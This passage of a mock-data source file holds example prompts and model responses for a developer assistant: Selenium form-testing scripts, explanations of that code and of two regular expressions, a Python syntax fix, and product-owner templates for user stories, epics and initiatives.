                'from selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\n# create a new browser session\ndriver = webdriver.Firefox()\n\n# navigate to the gym form page\ndriver.get("https://example.com/gym-form")\n\n# fill out the form fields with appropriate values\nfirst_name = driver.find_element_by_name("first_name")\nlast_name = driver.find_element_by_name("last_name")\nemail = driver.find_element_by_name("email")\nphone = driver.find_element_by_name("phone")\nage = driver.find_element_by_name("age")\ngender = driver.find_element_by_name("gender")\nmembership = driver.find_element_by_name("membership")\nsubmit = driver.find_element_by_name("submit")\n\nfirst_name.send_keys("John")\nlast_name.send_keys("Doe")\nemail.send_keys("johndoe@example.com")\nphone.send_keys("555-555-5555")\nage.send_keys("25")\ngender.send_keys("Male")\nmembership.send_keys("Premium")\nsubmit.click()\n\n# assert that the form submission was successful\nsuccess_message = driver.find_element_by_css_selector(".success-message")\nassert success_message.is_displayed()\n\n# close the browser session\ndriver.quit()',
            },
          },
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content:
                  'provide selenium scrip for testing the create savings accounts in the bank form in webpage in python',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\n# Create a new instance of the Firefox driver\ndriver = webdriver.Firefox()\n\n# Navigate to the Bank Form webpage\ndriver.get("https://www.bankform.com/create-saving-account")\n\n# Find all input fields by name and fill them out\nelem = driver.find_element_by_name("name")\nelem.clear()\nelem.send_keys("John Doe")\n\nelem = driver.find_element_by_name("email")\nelem.clear()\nelem.send_keys("john.doe@example.com")\n\nelem = driver.find_element_by_name("phone")\nelem.clear()\nelem.send_keys("1234567890")\n\nelem = driver.find_element_by_name("address")\nelem.clear()\nelem.send_keys("123 Main Street")\n\nelem = driver.find_element_by_name("city")\nelem.clear()\nelem.send_keys("New York")\n\nelem = driver.find_element_by_name("state")\nelem.clear()\nelem.send_keys("NY")\n\nelem = driver.find_element_by_name("zip")\nelem.clear()\nelem.send_keys("10001")\n\nelem = driver.find_element_by_name("accountType")\nelem.clear()\nelem.send_keys("Savings")\n\nelem = driver.find_element_by_name("initialDeposit")\nelem.clear()\nelem.send_keys("1000")\n\n# Submit the form\nelem.send_keys(Keys.RETURN)\n\n# Wait for page to load and close the browser\ndriver.implicitly_wait(10)\ndriver.close()\n```',
            },
          },
        ],
      },
      {
        shortTitle: 'EC',
        title: 'Explain Code',
        examples: [
          {
            request: [
              {
                content: 'Explain me the next code as a developer',
                role: 'system',
              },
              {
                content:
                  'from selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\n# create a new browser session\ndriver = webdriver.Firefox()\n\n# navigate to the gym form page\ndriver.get("https://example.com/gym-form")\n\n# fill out the form fields with appropriate values\nfirst_name = driver.find_element_by_name("first_name")\nlast_name = driver.find_element_by_name("last_name")\nemail = driver.find_element_by_name("email")\nphone = driver.find_element_by_name("phone")\nage = driver.find_element_by_name("age")\ngender = driver.find_element_by_name("gender")\nmembership = driver.find_element_by_name("membership")\nsubmit = driver.find_element_by_name("submit")\n\nfirst_name.send_keys("John")\nlast_name.send_keys("Doe")\nemail.send_keys("johndoe@example.com")\nphone.send_keys("555-555-5555")\nage.send_keys("25")\ngender.send_keys("Male")\nmembership.send_keys("Premium")\nsubmit.click()\n\n# assert that the form submission was successful\nsuccess_message = driver.find_element_by_css_selector(".success-message")\nassert success_message.is_displayed()\n\n# close the browser session\ndriver.quit()',
                role: 'user',
              },
            ],
            response: {
              content:
                'The code uses Selenium, a popular testing framework for web applications, to automate the process of filling out and submitting an online gym form. \n\nFirst, it creates a new browser session using the Firefox browser. Then, it navigates to the gym form page and uses `driver.find_element_by_name` to locate form fields on the page, and assigns them to variables. \n\nNext, the `send_keys()` method is used to input text values into these fields. Finally, after entering all the required information, `submit.click()` is used to submit the form.\n\nThen, the code asserts that the form was submitted successfully, by searching for a success message on the page with `find_element_by_css_selector()` and using `is_displayed()` to check that it is visible.\n\nFinally, the browser session is closed with `driver.quit()`.',
            },
          },
          {
            request: [
              {
                content: 'Explain me the next code as a developer',
                role: 'system',
              },
              {
                content:
                  '\n\n```\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\n# Create a new instance of the Firefox driver\ndriver = webdriver.Firefox()\n\n# Navigate to the Bank Form webpage\ndriver.get("https://www.bankform.com/create-saving-account")\n\n# Find all input fields by name and fill them out\nelem = driver.find_element_by_name("name")\nelem.clear()\nelem.send_keys("John Doe")\n\nelem = driver.find_element_by_name("email")\nelem.clear()\nelem.send_keys("john.doe@example.com")\n\nelem = driver.find_element_by_name("phone")\nelem.clear()\nelem.send_keys("1234567890")\n\nelem = driver.find_element_by_name("address")\nelem.clear()\nelem.send_keys("123 Main Street")\n\nelem = driver.find_element_by_name("city")\nelem.clear()\nelem.send_keys("New York")\n\nelem = driver.find_element_by_name("state")\nelem.clear()\nelem.send_keys("NY")\n\nelem = driver.find_element_by_name("zip")\nelem.clear()\nelem.send_keys("10001")\n\nelem = driver.find_element_by_name("accountType")\nelem.clear()\nelem.send_keys("Savings")\n\nelem = driver.find_element_by_name("initialDeposit")\nelem.clear()\nelem.send_keys("1000")\n\n# Submit the form\nelem.send_keys(Keys.RETURN)\n\n# Wait for page to load and close the browser\ndriver.implicitly_wait(10)\ndriver.close()\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis is a Python script that uses the Selenium webdriver library to automate the process of filling out an online bank account form. \n    \nThe script opens the Firefox browser and navigates to the page "https://www.bankform.com/create-saving-account". Then, it finds all input fields in the form by their name attributes, clears any existing input, and enters new data using the send_keys method. Finally, it submits the form by pressing the return key and waits for the webpage to load before closing the browser.',
            },
          },
        ],
      },
      {
        shortTitle: 'RE',
        title: 'REGEX Explain',
        examples: [
          {
            request: [
              {
                content: 'Explain me this regular expression',
                role: 'system',
              },
              {
                content: '\\d{1,2}/\\d{1,2}/\\d{4}',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis regular expression matches a date string in the format of MM/DD/YYYY, where:\n\n- \\d{1,2} matches one or two digits representing the month (MM).\n- / matches a forward-slash character between the month and day.\n- \\d{1,2} matches one or two digits representing the day (DD).\n- / matches another forward-slash character between the day and year.\n- \\d{4} matches four digits representing the year (YYYY).\n\nOverall, this regular expression matches a wide range of possible dates, allowing for single or double-digit months and days, and four-digit years.',
            },
          },
          {
            request: [
              {
                content: 'Explain me this regular expression',
                role: 'system',
              },
              {
                content: 'Regular Expression (^[a-zA-Z0-9][a-zA-Z0-9_.]*@[a-zA-Z0-9_.]+\\.[a-zA-Z]{2,6}$)',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis regular expression matches a valid email address with the following conditions:\n\n- ^ and $ indicate the start and end of the string respectively, ensuring that the entire string matches the pattern.\n- [a-zA-Z0-9] matches a single character that can be any uppercase or lowercase alphabet or any digit.\n- [a-zA-Z0-9_.]* matches zero or more characters which can be either uppercase or lowercase alphabet, any digit, underscore (_), or dot (.)\n- @ matches a literal at sign.\n- [a-zA-Z0-9_.]+ matches one or more characters which can be either uppercase or lowercase alphabet, any digit, underscore (_), or dot (.)\n- \\. matches a literal dot.\n- [a-zA-Z]{2,6} matches any two to six uppercase or lowercase alphabets at the end of the string, specifying the top-level domain.\n\nPut together, this expression matches valid email addresses with one or more alphanumeric characters, followed by an @ symbol, an alphanumeric domain name with optional periods and underscores, and a valid top-level domain ending in two to six alphabets.',
            },
          },
        ],
      },
      {
        shortTitle: 'DC',
        title: 'Debug Code',
        examples: [
          {
            request: [
              {
                content: 'is the following code correct? if not, tell me what\'s wrong.',
                role: 'system',
              },
              {
                content: 'X=7 \nif x = 7 \n print(\'this number is 7\') \n else: \n print(\'this number is not 7\')',
                role: 'user',
              },
            ],
            response: {
              content:
                'No, the code is not correct. There are a few errors: \n\n1. The variable name is inconsistent. In the first line, it\'s `X` (capital) but in the if statement, it\'s `x` (lowercase). Variable names are case-sensitive in Python, so you need to be consistent. \n\n2. The if statement needs a colon (`:`) at the end. \n\n3. The comparison operator used in the if statement is the assignment operator (`=`) instead of the equality operator (`==`). \n\nHere\'s the corrected code: \n\n```\nx = 7\nif x == 7:\n    print(\'this number is 7\')\nelse:\n    print(\'this number is not 7\')\n```',
            },
          },
          {
            request: [
              {
                content: 'is the following code correct? if not, tell me what\'s wrong.',
                role: 'system',
              },
              {
                content: 'X=7 \nif x = 7 \n print(\'this number is 7\') \n else: \n print(\'this number is not 7\')',
                role: 'user',
              },
            ],
            response: {
              content:
                'No, the code is not correct. There are a few errors: \n\n1. The variable name is inconsistent. In the first line, it\'s `X` (capital) but in the if statement, it\'s `x` (lowercase). Variable names are case-sensitive in Python, so you need to be consistent. \n\n2. The if statement needs a colon (`:`) at the end. \n\n3. The comparison operator used in the if statement is the assignment operator (`=`) instead of the equality operator (`==`). \n\nHere\'s the corrected code: \n\n```\nx = 7\nif x == 7:\n    print(\'this number is 7\')\nelse:\n    print(\'this number is not 7\')\n```',
            },
          },
        ],
      },
    ],
  },
];

export const MOCK_CONF_PROMPT_DATA = {
  'ui-engineering': {
    id: 'ui-engineering',
    display_name: 'UI Engineering',
    prompt: 'Respond as if you were a product owner for UI projects. Create an User Story with this format: \n\n ' +
    '--- \n\n' +
    '1. Title: <User story title> \n' +
    '2. Description: As a user <description> \n - Feature: <feature> \n - Scenarios <write at least 3 using Gherking>:\n' +
    '   - `SD:MANUAL_TEST_CASE` `ST`<Scenario Name>`ET`: `SDESC`<Scenario Description>`EDESC` `ED:MANUAL_TEST_CASE`\n' +
    '   - `SD:MANUAL_TEST_CASE` `ST`<Scenario Name>`ET`: `SDESC`<Scenario Description>`EDESC` `ED:MANUAL_TEST_CASE`\n' +
    '   - `SD:MANUAL_TEST_CASE` `ST`<Scenario Name>`ET`: `SDESC`<Scenario Description>`EDESC` `ED:MANUAL_TEST_CASE`\n' +
    '   - `SD:MANUAL_TEST_CASE` ... `ED:MANUAL_TEST_CASE`\n' +
    '3. Acceptance criteria:\n' +
    '   - `SD:ACCEPTANCE_CRITERIA` `ST`Criteria 1`ET`: `SDESC`<Criteria Details>`EDESC` `ED:ACCEPTANCE_CRITERIA`\n' +
    '   - `SD:ACCEPTANCE_CRITERIA` `ST`Criteria 2`ET`: `SDESC`<Criteria Details>`EDESC` `ED:ACCEPTANCE_CRITERIA`\n' +
    '   - `SD:ACCEPTANCE_CRITERIA` `ST`Criteria 3`ET`: `SDESC`<Criteria Details>`EDESC` `ED:ACCEPTANCE_CRITERIA`\n' +
    '   - `SD:ACCEPTANCE_CRITERIA` ... `ED:ACCEPTANCE_CRITERIA`\n' +
    '4. Story points: <amount and argument why you decided that value>. \n\n' +
    '5. Topics to discuss with each team required: \n - Topic I \n - Topic II \n - ... \n\n' +
    '6. Additional Documentation: \n - Doc I \n - Doc II \n - ... \n\n' +
    '7. `SD:UNHAPPY_PATH` `ST`Unhappy path`ET`: `SDESC`<scenario and argument>`EDESC` `ED:UNHAPPY_PATH` \n\n' +
    '8. Business Value (tangible and intangible benefits a business can get from the capabilities of a product): \n'
  },
  'scalable-platforms': {
    id: 'scalable-platforms',
    display_name: 'Scalable Platforms',
    prompt: 'Respond as if you were a product owner for scalable platforms projects. Create an User Story with this format: \n\n ' +
    '--- \n\n' +
    '1. Title: <User story title> \n' +
    '2. Description: As a user <description> \n - Feature: <feature> \n - Scenarios <write at least 3 using Gherking>:\n' +
    '   - `SD:MANUAL_TEST_CASE` `ST`<Scenario Name>`ET`: `SDESC`<Scenario Description>`EDESC` `ED:MANUAL_TEST_CASE`\n' +
    '   - `SD:MANUAL_TEST_CASE` `ST`<Scenario Name>`ET`: `SDESC`<Scenario Description>`EDESC` `ED:MANUAL_TEST_CASE`\n' +
    '   - `SD:MANUAL_TEST_CASE` `ST`<Scenario Name>`ET`: `SDESC`<Scenario Description>`EDESC` `ED:MANUAL_TEST_CASE`\n' +
    '   - `SD:MANUAL_TEST_CASE` ... `ED:MANUAL_TEST_CASE`\n' +
    '3. Acceptance criteria:\n' +
    '   - `SD:ACCEPTANCE_CRITERIA` `ST`Criteria 1`ET`: `SDESC`<Criteria Details>`EDESC` `ED:ACCEPTANCE_CRITERIA`\n' +
    '   - `SD:ACCEPTANCE_CRITERIA` `ST`Criteria 2`ET`: `SDESC`<Criteria Details>`EDESC` `ED:ACCEPTANCE_CRITERIA`\n' +
    '   - `SD:ACCEPTANCE_CRITERIA` `ST`Criteria 3`ET`: `SDESC`<Criteria Details>`EDESC` `ED:ACCEPTANCE_CRITERIA`\n' +
    '   - `SD:ACCEPTANCE_CRITERIA` ... `ED:ACCEPTANCE_CRITERIA`\n' +
    '4. Story points: <amount and argument why you decided that value>. \n\n' +
    '5. Topics to discuss with each team required: \n - Topic I \n - Topic II \n - ... \n\n' +
    '6. Additional Documentation: \n - Doc I \n - Doc II \n - ... \n\n' +
    '7. `SD:UNHAPPY_PATH` `ST`Unhappy path`ET`: `SDESC`<scenario and argument>`EDESC` `ED:UNHAPPY_PATH` \n\n' +
    '8. Business Value (tangible and intangible benefits a business can get from the capabilities of a product): \n'
  },
  'epic': {
    id: 'epic',
    display_name: 'Epic',
    prompt: 'Respond as if you were a product owner. Create all the users stories an for an epic with this format adding as many as you can: \n\n ' +
    '--- \n\n' +
    '1. `SD` `ST`<User Story Name>`ET`: `SDESC`<User Story Description>`EDESC` `ED`\n' +
    '2. `SD` `ST`<User Story Name>`ET`: `SDESC`<User Story Description>`EDESC` `ED`\n' +
    '3. `SD` `ST`<User Story Name>`ET`: `SDESC`<User Story Description>`EDESC` `ED`\n' +
    '...\n\n'
  },
  'initiative': {
    id: 'initiative',
    display_name: 'Initiative',
    prompt: 'Respond as if you were a product owner creating a new project. Create all the epics with this format adding as many as you can: \n\n ' +
    '--- \n\n' +
    '1. `SD` `ST`<Epic Name>`ET`: `SDESC`<Epic Description>`EDESC` `ED`\n' +
    '2. `SD` `ST`<Epic Name>`ET`: `SDESC`<Epic Description>`EDESC` `ED`\n' +
    '3. `SD` `ST`<Epic Name>`ET`: `SDESC`<Epic Description>`EDESC` `ED`\n' +
    '...\n\n'
  }
}